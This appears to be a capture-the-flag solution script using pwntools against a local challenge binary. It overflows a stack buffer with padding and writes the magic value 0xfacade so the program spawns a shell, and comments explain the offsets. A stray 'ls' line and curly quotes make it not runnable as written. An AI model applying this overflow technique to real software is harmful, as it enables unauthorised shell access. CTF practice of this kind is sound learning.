from pwn import *

p = process (“./chall_00”)
p.recv()
payload = b'' 
payload+= (0x40-0x4) * b'A'
payload += p32(0xfacade)
p.sendline(payload)
p.interactive()
ls


# we have a /bin/sh string being called - this lets us execute shell code = win
#we're checking if dword is = 0xfacade, if it is then enter our win function, 
#if not, jump outside. dword 
#want to fill up the space before the tape with junk, then write 0xfacade
#example - b'A'*(0x70 + 8 - len(shellcode))